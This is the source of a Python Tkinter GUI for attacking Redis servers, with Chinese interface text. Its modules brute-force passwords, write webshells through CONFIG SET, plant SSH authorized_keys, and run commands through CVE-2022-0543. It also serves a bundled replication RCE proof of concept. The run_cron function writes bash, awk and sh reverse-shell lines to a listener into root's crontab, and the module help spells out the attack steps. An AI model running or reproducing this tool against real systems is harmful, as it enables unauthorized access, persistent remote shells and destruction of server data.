import os
import threading
import tkinter as tk
from tkinter import filedialog, messagebox, scrolledtext, ttk

from pyredisexp import RedisExpClient


class RedisExpGUI:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("Redis tool GUI -- By zjewel")
        self.root.geometry("1150x780")

        self.client = RedisExpClient(logger=self.log)
        self._init_module_docs()
        self._init_vars()
        self._build_widgets()

    def _init_vars(self):
        # 连接信息
        self.rhost = tk.StringVar(value="127.0.0.1")
        self.rport = tk.StringVar(value="6379")
        self.password = tk.StringVar()

        # 基础命令
        self.cli_command = tk.StringVar()

        # RCE / 模块
        self.exec_template = tk.StringVar(value="system.exec")
        self.exec_name = tk.StringVar(value="system")

        # WebShell / SSH / Cron
        self.shell_path = tk.StringVar(value="/var/www/html/")
        self.shell_file = tk.StringVar(value="testaa.jsp")
        self.shell_gbk = tk.BooleanVar(value=False)
        self.ssh_user = tk.StringVar(value="root")
        self.cron_lhost = tk.StringVar(value="127.0.0.1")
        self.cron_lport = tk.StringVar(value="7777")

        # 其他模块
        self.dir_target = tk.StringVar()
        self.brute_wordlist = tk.StringVar()
        # CVE-2022-0543 默认命令设置为 whoami
        self.cve_command = tk.StringVar(value="whoami")

    def _init_module_docs(self):
        self.module_docs = {
            "cli": (
                "【CLI 控制台】在输入框中填写原生命令，例如 info replication、config get dir。"
                "支持带空格命令，必要时用双引号包裹整条指令。功能：执行任意 Redis 指令并查看实时回显。"
            ),
            "webshell": (
                "【写WebShell】（需要知道网站绝对路径，可以配合目录探测使用）填写目标路径与文件名，文本框内贴入shell内容，可选 GBK 路径。实际是任意文件写入\n"
                "config set dir /var/www/html/----"
                "config set dbfilename testaa.php----"
                "set xxx \"<?php phpinfo();?>\"---- "
                "save"
            ),
            "ssh": (
                "【写SSH公钥】填写目标用户（root或者user等，可以自动设置路径）或直接填写绝对路径。"
                "功能：将公钥写入 authorized_keys，方便后续使用 ssh 免密登录。"
                "攻击机执行：ssh-keygen -t rsa（直接回车设置密码为空）----- cd /root/.ssh/ -----(echo -e \"\\n\\n\"; cat id_rsa.pub; echo -e \"\\n\\n\") > 1.txt-----cat 1.txt-----上传之后，攻击机连接：ssh -i ./id_rsa root@192.168.58.131"
            ),
            "cron": (
                "【写计划任务】填写你的反连IP/端口，点击写入即可。\n"
                "功能：生成每分钟执行的bash反弹脚本写入/var/spool/cron/root，实现反弹shell。攻击机监听：nc -lvvp 7777\n"
                "注意：该攻击会覆盖服务器原有的root计划任务！！！！"

            ),
            "dir_check": (
                "【目录探测】在输入框填写绝对路径，点击探测即可。"
                "功能：通过 CONFIG SET dir 判断某个目录/文件是否存在，常用于踩点或确认写入位置。"
            ),
            "brute": (
                "【密码爆破】选择包含多行密码的字典文件，并确保目标 IP/端口已填。"
                "功能：调用多线程爆破逻辑，实时回显成功密码与失败原因。"
            ),
            "cve": (
                "【CVE-2022-0543】直接填写想要执行的系统命令，适用于 Debian/Ubuntu 存在 Lua 沙盒逃逸漏洞的 Redis。"
                "功能：通过 Lua 动态链接方式执行任意命令，实现无主从情况下的命令执行。"
            ),
            "replication_rce": (
                "【主从复制RCE POC】注意：该主从复制命令执行会清空目标redis数据！！！！\n"
                "点击下载按钮即可将随工具附带的 redis_rce.py 保存到本地。请将该 POC 放到你自己的服务器上使用。\n"
                "具体使用可点击查看详情"
            ),
        }

    def _build_widgets(self):
        self._build_connection_frame()
        self._build_hint_panel()
        self._build_module_tabs()
        self._build_log_frame()

    def _build_connection_frame(self):
        frame = ttk.LabelFrame(self.root, text="目标连接")
        frame.pack(fill="x", padx=10, pady=8)

        ttk.Label(frame, text="目标 IP").grid(row=0, column=0, padx=4, pady=6, sticky="e")
        ttk.Entry(frame, textvariable=self.rhost, width=18).grid(row=0, column=1)
        ttk.Label(frame, text="端口").grid(row=0, column=2, sticky="e")
        ttk.Entry(frame, textvariable=self.rport, width=8).grid(row=0, column=3)
        ttk.Label(frame, text="密码").grid(row=0, column=4, sticky="e")
        ttk.Entry(frame, textvariable=self.password, width=20, show="*").grid(row=0, column=5)

        ttk.Button(frame, text="连接", command=self.connect, width=12).grid(row=0, column=6, padx=8)
        ttk.Button(frame, text="查询信息", command=lambda: self.run_task("info", self.client.redis_version), width=12).grid(
            row=0, column=7, padx=4
        )

    def _build_hint_panel(self):
        hint_frame = ttk.LabelFrame(self.root, text="模块说明（点击任意模块自动刷新）")
        hint_frame.pack(fill="x", padx=10, pady=5)
        self.hint_text = scrolledtext.ScrolledText(hint_frame, height=4, state="disabled", wrap="word")
        self.hint_text.pack(fill="x", padx=6, pady=6)
        self._update_hint("点击标签页即可查看该模块的填写方法与功能说明。")

    def _update_hint(self, message: str):
        self.hint_text.configure(state="normal")
        self.hint_text.delete("1.0", "end")
        self.hint_text.insert("end", message)
        self.hint_text.configure(state="disabled")

    def _show_module_info(self, key: str):
        info = self.module_docs.get(key)
        if not info:
            return
        self._update_hint(info)

    def _attach_module_hint(self, widget: tk.Widget, key: str):
        widget.bind("<Button-1>", lambda _event, k=key: self._show_module_info(k), add="+")

    def _register_tab(self, frame: ttk.Frame, key: str):
        if not hasattr(self, "tab_keys"):
            self.tab_keys = {}
        self.tab_keys[frame] = key
        self._attach_module_hint(frame, key)

    def _on_tab_change(self, event):
        widget = event.widget
        if not isinstance(widget, ttk.Notebook):
            return
        current = widget.nametowidget(widget.select())
        key = self.tab_keys.get(current)
        if key:
            self._show_module_info(key)

    def _build_module_tabs(self):
        notebook = ttk.Notebook(self.root)
        notebook.pack(fill="both", expand=True, padx=10, pady=5)
        self.module_notebook = notebook
        modules = [
            ("密码爆破", "brute", self._build_brute_tab),
            ("CLI控制台", "cli", self._build_cli_tab),
            ("计划任务反弹shell", "cron", self._build_cron_tab),
            ("写SSH公钥拿shell", "ssh", self._build_ssh_tab),
            ("目录探测", "dir_check", self._build_dir_tab),
            ("写WebShell", "webshell", self._build_webshell_tab),
            ("CVE-2022-0543", "cve", self._build_cve_tab),
            ("主从复制RCE", "replication_rce", self._build_replication_rce_tab),
        ]

        created_frames = []
        for title, key, builder in modules:
            frame = ttk.Frame(notebook)
            builder(frame)
            notebook.add(frame, text=title)
            self._register_tab(frame, key)
            created_frames.append((frame, key))

        notebook.bind("<<NotebookTabChanged>>", self._on_tab_change)
        if created_frames:
            self._show_module_info(created_frames[0][1])

    def _build_info_tab(self, frame: ttk.Frame):
        ttk.Label(frame, text="直接调用 INFO 读取基础信息。", anchor="w").pack(fill="x", padx=12, pady=8)
        ttk.Button(frame, text="INFO", command=lambda: self.run_task("info", self.client.redis_version), width=18).pack(
            padx=12, pady=12, anchor="w"
        )

    def _build_cli_tab(self, frame: ttk.Frame):
        ttk.Label(frame, text="CLI 命令").grid(row=0, column=0, padx=10, pady=10, sticky="e")
        ttk.Entry(frame, textvariable=self.cli_command, width=80).grid(row=0, column=1, padx=5, pady=10, sticky="w")
        ttk.Button(frame, text="执行 CLI", command=self.run_cli, width=15).grid(row=0, column=2, padx=10, pady=10)

    def _build_webshell_tab(self, frame: ttk.Frame):
        shell_box = ttk.LabelFrame(frame, text="写 WebShell")
        shell_box.pack(fill="both", expand=True, padx=10, pady=10)
        self._add_entry_row(shell_box, "目标路径", self.shell_path, 0, width=40)
        self._add_entry_row(shell_box, "目标文件", self.shell_file, 0, col=2, width=20)
        self.webshell_text = scrolledtext.ScrolledText(shell_box, height=8)
        self.webshell_text.grid(row=1, column=0, columnspan=4, padx=5, pady=6, sticky="nsew")
        # 默认 WebShell 内容（JSP 示例）
        default_webshell = (
            '<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>\n'
            "\n"
            "<!DOCTYPE html>\n"
            "<html>\n"
            "<head>\n"
            '    <meta charset="UTF-8">\n'
            "    <title>Test Page</title>\n"
            "</head>\n"
            "<body>\n"
            "    <% \n"
            '        out.println("Hello World"); \n'
            "    %>\n"
            "</body>\n"
            "</html>\n"
        )
        self.webshell_text.insert("1.0", default_webshell)
        shell_box.rowconfigure(1, weight=1)
        ttk.Checkbutton(shell_box, text="GBK 路径", variable=self.shell_gbk).grid(row=2, column=0, padx=5, pady=4, sticky="w")
        ttk.Button(shell_box, text="写入 WebShell", command=self.run_shell, width=18).grid(row=2, column=3, padx=5, pady=4, sticky="e")

    def _build_ssh_tab(self, frame: ttk.Frame):
        ssh_box = ttk.LabelFrame(frame, text="写 SSH 公钥")
        ssh_box.pack(fill="both", expand=True, padx=10, pady=10)
        self._add_entry_row(ssh_box, "SSH 用户 / 目录", self.ssh_user, 0, width=40, colspan=2)
        self.ssh_text = scrolledtext.ScrolledText(ssh_box, height=6)
        self.ssh_text.grid(row=1, column=0, columnspan=4, padx=5, pady=6, sticky="nsew")
        ssh_box.rowconfigure(1, weight=1)
        ttk.Button(ssh_box, text="写入 SSH Key", command=self.run_ssh, width=18).grid(row=2, column=3, padx=5, pady=4, sticky="e")

    def _build_cron_tab(self, frame: ttk.Frame):
        cron_box = ttk.LabelFrame(frame, text="计划任务反弹")
        cron_box.pack(fill="x", padx=10, pady=10)
        self._add_entry_row(cron_box, "反连 IP", self.cron_lhost, 0, width=25)
        self._add_entry_row(cron_box, "反连端口", self.cron_lport, 0, col=2, width=15)
        ttk.Button(cron_box, text="写入 Cron", command=self.run_cron, width=18).grid(row=0, column=4, padx=8, pady=6, sticky="e")

    def _build_dir_tab(self, frame: ttk.Frame):
        dir_box = ttk.LabelFrame(frame, text="目录/文件存在性检测")
        dir_box.pack(fill="x", padx=10, pady=10)
        self._add_entry_row(dir_box, "绝对路径", self.dir_target, 0, width=55, colspan=2)
        ttk.Button(dir_box, text="探测", command=self.run_dir_check, width=15).grid(row=0, column=3, padx=5, pady=6)

    def _build_brute_tab(self, frame: ttk.Frame):
        brute_box = ttk.LabelFrame(frame, text="密码字典爆破")
        brute_box.pack(fill="x", padx=10, pady=10)
        ttk.Label(brute_box, text="密码字典").grid(row=0, column=0, padx=5, pady=6, sticky="e")
        ttk.Entry(brute_box, textvariable=self.brute_wordlist, width=50).grid(row=0, column=1, padx=5, pady=6, sticky="w")
        ttk.Button(brute_box, text="浏览", command=lambda: self._select_file(self.brute_wordlist)).grid(row=0, column=2, padx=5, pady=6)
        ttk.Button(brute_box, text="开始爆破", command=self.run_brute, width=15).grid(row=0, column=3, padx=5, pady=6)

    def _build_cve_tab(self, frame: ttk.Frame):
        cve_box = ttk.LabelFrame(frame, text="CVE-2022-0543 命令执行")
        cve_box.pack(fill="x", padx=10, pady=10)
        self._add_entry_row(cve_box, "执行命令", self.cve_command, 0, width=65, colspan=3)
        ttk.Button(cve_box, text="执行 CVE", command=self.run_cve, width=18).grid(row=1, column=2, padx=5, pady=6, sticky="e")

    def _build_replication_rce_tab(self, frame: ttk.Frame):
        box = ttk.LabelFrame(frame, text="主从复制 RCE POC 获取")
        box.pack(fill="x", padx=10, pady=10)
        ttk.Label(
            box,
            text="点击下方按钮保存 redis_rce.py 到本地。\n请将 POC 放到自己的服务器，按照上面说明触发 RCE。",
            anchor="w",
            justify="left",
        ).pack(fill="x", padx=6, pady=8)
        btn_row = ttk.Frame(box)
        btn_row.pack(fill="x", padx=6, pady=4)
        ttk.Button(btn_row, text="下载 poc", command=self.download_replication_poc, width=20).pack(side="left", padx=(0, 8))
        ttk.Button(btn_row, text="查看使用详情", command=self.show_replication_readme, width=20).pack(side="left")

    def _add_entry_row(
        self,
        frame: ttk.Widget,
        label: str,
        variable: tk.StringVar,
        row: int,
        width: int = 20,
        col: int = 0,
        colspan: int = 1,
    ):
        ttk.Label(frame, text=label).grid(row=row, column=col, padx=5, pady=4, sticky="e")
        ttk.Entry(frame, textvariable=variable, width=width).grid(row=row, column=col + 1, columnspan=colspan, padx=5, pady=4, sticky="w")

    def _build_log_frame(self):
        frame = ttk.LabelFrame(self.root, text="日志输出")
        frame.pack(fill="both", expand=True, padx=10, pady=5)

        # 清除日志按钮（放在日志文本区域上方）
        btn_frame = ttk.Frame(frame)
        btn_frame.pack(fill="x", padx=5, pady=(5, 0), anchor="e")
        ttk.Button(btn_frame, text="清除日志", command=self.clear_log, width=10).pack(side="right")

        # 日志文本区域
        self.log_text = scrolledtext.ScrolledText(frame, height=16, state="disabled", font=("Consolas", 10))
        self.log_text.pack(fill="both", expand=True, padx=5, pady=5)

    # 工具函数
    def _select_file(self, var: tk.StringVar):
        path = filedialog.askopenfilename()
        if path:
            var.set(path)

    def log(self, message: str):
        self.log_text.configure(state="normal")
        self.log_text.insert("end", message + "\n")
        self.log_text.see("end")
        self.log_text.configure(state="disabled")

    def clear_log(self):
        """清空日志输出内容。"""
        self.log_text.configure(state="normal")
        self.log_text.delete("1.0", "end")
        self.log_text.configure(state="disabled")

    def connect(self):
        def task():
            try:
                self.client.connect(self.rhost.get(), self.rport.get(), self.password.get())
                self.client.set_exec_options(self.exec_template.get(), self.exec_name.get())
            except Exception as exc:
                messagebox.showerror("连接失败", str(exc))

        threading.Thread(target=task, daemon=True).start()

    def run_task(self, title: str, func, *args, **kwargs):
        def task():
            try:
                self.client.set_exec_options(self.exec_template.get(), self.exec_name.get())
                self.log(f"[任务开始] {title}")
                func(*args, **kwargs)
                self.log(f"[任务完成] {title}")
            except Exception as exc:
                self.log(f"[任务失败] {title}: {exc}")
                messagebox.showerror("执行失败", str(exc))

        threading.Thread(target=task, daemon=True).start()

    def run_cli(self):
        cmd = self.cli_command.get().strip()
        if not cmd:
            messagebox.showwarning("提示", "请输入 CLI 命令")
            return
        self.run_task("CLI", self.client.cli, cmd)

    def run_dir_check(self):
        target = self.dir_target.get().strip()
        if not target:
            messagebox.showwarning("提示", "请输入目标绝对路径")
            return
        self.run_task("dir", self.client.check_dir, target, gbk_mode=False)

    def run_shell(self):
        content = self.webshell_text.get("1.0", "end").strip()
        if not (self.shell_path.get().strip() and self.shell_file.get().strip() and content):
            messagebox.showwarning("提示", "路径/文件/内容不能为空")
            return
        self.run_task(
            "shell",
            self.client.echo_shell,
            self.shell_path.get().strip(),
            self.shell_file.get().strip(),
            content,
            gbk_mode=self.shell_gbk.get(),
        )

    def run_ssh(self):
        content = self.ssh_text.get("1.0", "end").strip()
        if not content:
            messagebox.showwarning("提示", "请填写公钥内容")
            return
        user = self.ssh_user.get().strip() or "root"
        if user == "root":
            directory = "/root/.ssh/"
        elif "/" in user:
            directory = user
        else:
            directory = f"/home/{user}/.ssh/"
        self.run_task(
            "ssh",
            self.client.echo_shell,
            directory,
            "authorized_keys",
            content,
            gbk_mode=False,
        )

    def run_cron(self):
        if not (self.cron_lhost.get().strip() and self.cron_lport.get().strip()):
            messagebox.showwarning("提示", "请填写反连 IP/端口")
            return
        content = f"*/1 * * * * /bin/bash -c 'bash -i >& /dev/tcp/{self.cron_lhost.get().strip()}/{self.cron_lport.get().strip()} 0>&1'\n*/1 * * * * /usr/bin/awk 'BEGIN {{s = \"/inet/tcp/0/{self.cron_lhost.get().strip()}/{self.cron_lport.get().strip()}\"; while(42) {{ do{{ printf \"shell>\" |& s; s |& getline c; if(c){{ while ((c |& getline) > 0) print $0 |& s; close(c); }} }} while(c != \"exit\") close(s); }} }}' /dev/null\n*/1 * * * * /bin/sh -c 'exec 5<>/dev/tcp/{self.cron_lhost.get().strip()}/{self.cron_lport.get().strip()};cat <&5 | while read line; do $line 2>&5 >&5; done'"
        self.run_task(
            "cron",
            self.client.echo_shell,
            "/var/spool/cron/",
            "root",
            content,
            gbk_mode=False,
        )

    def run_brute(self):
        if not self.brute_wordlist.get().strip():
            messagebox.showwarning("提示", "请选择密码字典")
            return
        self.run_task("brute", self.client.brute_pwd, self.brute_wordlist.get().strip(), self.rhost.get(), self.rport.get())

    def run_cve(self):
        cmd = self.cve_command.get().strip()
        if not cmd:
            messagebox.showwarning("提示", "请输入要执行的命令")
            return
        self.run_task("cve", self.client.redis_lua, cmd)

    def download_replication_poc(self):
        """将随程序的 redis_rce.py 复制到用户选择的位置。"""
        src_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "redis_rce.py")
        if not os.path.exists(src_path):
            messagebox.showerror("错误", f"未找到 POC 文件：{src_path}")
            return
        save_path = filedialog.asksaveasfilename(
            title="选择保存位置",
            initialfile="redis_rce.py",
            defaultextension=".py",
            filetypes=[("Python files", "*.py"), ("所有文件", "*.*")],
        )
        if not save_path:
            return
        try:
            with open(src_path, "rb") as src, open(save_path, "wb") as dst:
                dst.write(src.read())
            messagebox.showinfo("成功", f"已保存到：{save_path}\n请将 POC 放到你的公网服务器上使用。")
            self.log(f"[POC 下载] {save_path}")
        except Exception as exc:
            messagebox.showerror("保存失败", str(exc))
            self.log(f"[POC 下载失败] {exc}")

    def show_replication_readme(self):
        """弹窗展示主从复制 RCE 的使用说明（读取 README_RCE.md）。"""
        readme_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "README_RCE.md")
        if not os.path.exists(readme_path):
            messagebox.showerror("错误", f"未找到说明文件：{readme_path}")
            return
        try:
            with open(readme_path, "r", encoding="utf-8", errors="ignore") as f:
                content = f.read()
        except Exception as exc:
            messagebox.showerror("读取失败", str(exc))
            return

        win = tk.Toplevel(self.root)
        win.title("主从复制 RCE 使用详情")
        win.geometry("820x520")
        text = scrolledtext.ScrolledText(win, wrap="word")
        text.pack(fill="both", expand=True, padx=8, pady=8)
        text.insert("1.0", content)
        text.configure(state="disabled")
        ttk.Button(win, text="关闭", command=win.destroy, width=10).pack(pady=(0, 10))

    def start(self):
        self.root.mainloop()


if __name__ == "__main__":
    RedisExpGUI().start()

